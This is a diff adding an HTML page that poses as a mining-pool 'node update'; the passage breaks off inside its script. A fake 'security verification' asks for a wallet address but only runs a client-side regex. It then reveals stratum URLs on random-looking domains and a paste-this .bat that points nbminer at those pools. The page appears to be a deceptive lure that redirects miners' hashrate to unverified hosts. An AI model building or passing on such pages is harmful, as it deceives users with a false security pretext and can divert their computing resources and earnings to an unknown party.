@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pool Node Update</title>
+    <style>
+        :root {
+            --bg-color: #f6f8fa;
+            --container-bg: #ffffff;
+            --text-main: #24292e;
+            --text-muted: #586069;
+            --border-color: #e1e4e8;
+            --primary-green: #28a745;
+            --error-red: #d73a49;
+            --accent-blue: #0366d6;
+        }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
+            line-height: 1.6; 
+            color: var(--text-main); 
+            background-color: var(--bg-color); 
+            padding: 16px; 
+            margin: 0;
+        }
+        .container { 
+            max-width: 850px; 
+            margin: 0 auto; 
+            background: var(--container-bg); 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            padding: 20px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05); 
+        }
+        h3 { margin-top: 24px; font-size: 18px; border-bottom: 1px solid #eaecef; padding-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        h3:first-of-type { margin-top: 0; }
+        p { color: var(--text-muted); font-size: 13px; margin-bottom: 16px; }
+        
+        /* 🔒 钱包验证闸门区域样式 */
+        .gate-box {
+            background: #f8f9fa;
+            border: 1px dashed var(--accent-blue);
+            border-radius: 8px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .gate-box h4 { margin: 0 0 10px 0; color: var(--accent-blue); font-size: 16px; }
+        .input-group {
+            display: flex;
+            gap: 10px;
+            max-width: 550px;
+            margin: 15px auto 0 auto;
+        }
+        .input-wallet {
+            flex: 1;
+            padding: 10px 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: monospace;
+            outline: none;
+        }
+        .input-wallet:focus { border-color: var(--accent-blue); box-shadow: 0 0 0 3px rgba(3,102,214,0.1); }
+        .btn-verify {
+            background-color: var(--accent-blue);
+            color: #ffffff;
+            border: 1px solid transparent;
+            border-radius: 6px;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .btn-verify:hover { background-color: #0255b3; }
+        .error-msg { color: var(--error-red); font-size: 12px; margin-top: 8px; display: none; font-weight: 500; }
+
+        /* 🚪 核心控制：默认隐藏矿池核心数据 */
+        .secure-content { display: none; }
+
+        /* 电脑端默认表格样式 */
+        .node-table { width: 100%; border-collapse: collapse; margin-top: 16px; display: table; }
+        .node-table th, .node-table td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 14px; }
+        .node-table th { background-color: var(--bg-color); font-weight: 600; }
+        
+        /* 手机端隐藏的卡片式布局（默认隐藏） */
+        .mobile-cards { display: none; }
+
+        code { font-family: "SFMono-Regular", Consolas, monospace; background-color: rgba(27,31,35,0.05); padding: 0.3em 0.5em; border-radius: 4px; font-size: 85%; word-break: break-all; }
+        .btn-copy { background-color: #fafbfc; border: 1px solid rgba(27,31,35,0.15); border-radius: 6px; padding: 5px 12px; font-size: 12px; font-weight: 500; cursor: pointer; white-space: nowrap; }
+        .btn-copy:hover { background-color: #f3f4f6; }
+        pre { background: #23272e; color: #abb2bf; padding: 16px; border-radius: 6px; overflow-x: auto; font-family: monospace; font-size: 13px; margin-top: 10px; }
+        
+        /* 手机垂直屏幕自适应媒体查询 */
+        @media screen and (max-width: 768px) {
+            body { padding: 10px; }
+            .container { padding: 16px; }
+            .input-group { flex-direction: column; gap: 8px; }
+            .btn-verify { width: 100%; padding: 12px 0; }
+            .node-table { display: none; }
+            .mobile-cards { display: block; margin-top: 16px; }
+            .card { background: #f8f9fa; border: 1px solid var(--border-color); border-radius: 8px; padding: 14px; margin-bottom: 12px; }
+            .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+            .card-title { font-weight: bold; font-size: 14px; }
+            .card-status { font-size: 12px; font-weight: 500; }
+            .card-body { margin-bottom: 12px; }
+            .card-action .btn-copy { width: 100%; padding: 8px 0; font-size: 13px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- 🔒 1. 钱包地址锁验证闸门 -->
+    <div class="gate-box" id="gatekeeper">
+        <h4>🔒 Security Verification Required</h4>
+        <p>To prevent malicious tracking and DDoS attacks, please enter your active miner wallet address below to unlock the latest pool configuration nodes.</p>
+        <div class="input-group">
+            <input type="text" id="wallet-input" class="input-wallet" placeholder="Enter your Wallet Address (e.g., 0x... or r...)" autocomplete="off">
+            <button class="btn-verify" onclick="validateWallet()">Unlock Nodes</button>
+        </div>
+        <div class="error-msg" id="error-box">⚠️ Invalid address format. Please provide a valid alphanumeric wallet address (26-62 characters).</div>
+    </div>
+
+    <!-- 🚪 2. 受保护的核心数据区域（验证成功后展现） -->
+    <div class="secure-content" id="secure-zone">
+        <h3>🌐 Node Update: Onchain Wallet & Mining Pool Support</h3>
+        <p>Verification successful. Below are the active primary and failover nodes. Please update your miner configuration accordingly.</p>
+
+        <!-- 电脑端表格 -->
+        <table class="node-table">
+            <thead>
+                <tr>
+                    <th>Location / Type</th>
+                    <th>Stratum / Node URL</th>
+                    <th>Status</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Primary Node</strong></td>
+                    <td><code id="pc-p">stratum+tcp://jsijeg.com:3333</code></td>
+                    <td>🟢 Active</td>
+                    <td><button class="btn-copy" onclick="copyText('pc-p', this)">Copy</button></td>
+                </tr>
+                <tr>
+                    <td><strong>Failover Node 1</strong></td>
+                    <td><code id="pc-f1">stratum+tcp://jsiehgi.org:3333</code></td>
+                    <td>🟢 Backup</td>
+                    <td><button class="btn-copy" onclick="copyText('pc-f1', this)">Copy</button></td>
+                </tr>
+                <tr>
+                    <td><strong>Failover Node 2</strong></td>
+                    <td><code id="pc-f2">stratum+tcp://jsijeg.com:3333</code></td>
+                    <td>🟢 Backup</td>
+                    <td><button class="btn-copy" onclick="copyText('pc-f2', this)">Copy</button></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <!-- 手机端卡片 -->
+        <div class="mobile-cards">
+            <div class="card">
+                <div class="card-header"><span class="card-title">Primary Node</span><span class="card-status">🟢 Active</span></div>
+                <div class="card-body"><code id="mb-p">stratum+tcp://jsijeg.com:3333</code></div>
+                <div class="card-action"><button class="btn-copy" onclick="copyText('mb-p', this)">Copy Node URL</button></div>
+            </div>
+            <div class="card">
+                <div class="card-header"><span class="card-title">Failover Node 1</span><span class="card-status">🟢 Backup</span></div>
+                <div class="card-body"><code id="mb-f1">stratum+tcp://jsiehgi.org:3333</code></div>
+                <div class="card-action"><button class="btn-copy" onclick="copyText('mb-f1', this)">Copy Node URL</button></div>
+            </div>
+            <div class="card">
+                <div class="card-header"><span class="card-title">Failover Node 2</span><span class="card-status">🟢 Backup</span></div>
+                <div class="card-body"><code id="mb-f2">stratum+tcp://jsijeg.com:3333</code></div>
+                <div class="card-action"><button class="btn-copy" onclick="copyText('mb-f2', this)">Copy Node URL</button></div>
+            </div>
+        </div>
+
+        <h3>💻 Windows Quick Start (.bat)</h3>
+        <p>Create a new text file, rename it to <code>start_mining.bat</code>, and paste the code below. Replace <code>YOUR_WALLET</code> with your address.</p>
+        <pre id="bat-code">@echo off
+set WALLET=YOUR_WALLET_ADDRESS.worker1
+nbminer -a ethash -o stratum+tcp://jsijeg.com:3333 -u %WALLET% -o1 stratum+tcp://jsiehgi.org:3333 -o2 stratum+tcp://jsijeg.com:3333
+pause</pre>
+    </div>
+</div>
+
+<script>
+    function validateWallet() {
+        const walletInput = document.getElementById('wallet-input').value.trim();
+        const errorBox = document.getElementById('error-box');
+        const gatekeeper = document.getElementById('gatekeeper');
+        const secureZone = document.getElementById('secure-zone');
+
+        const walletRegex = /^[a-zA-Z0-9]{26,62}$/;
+
+        if (walletRegex.test(walletInput)) {
+            errorBox.style.display = 'none';
+            gatekeeper.style.display = 'none';
+            secureZone.style.display = 'block';
+            
+            const batCode = document.getElementById('bat-code');
+            batCode.innerText = `@echo off\nset WALLET=${walletInput}.worker1\nnbminer -a ethash -o stratum+tcp://jsijeg.com:3333 -u %WALLET% -o1 stratum+tcp://jsiehgi.org:3333 -o2 stratum+tcp://jsijeg.com:3333\npause`;
+        } else {
+            errorBox.style.display = 'block';
+        }
+    }
+
+    function copyText(id, btn) {
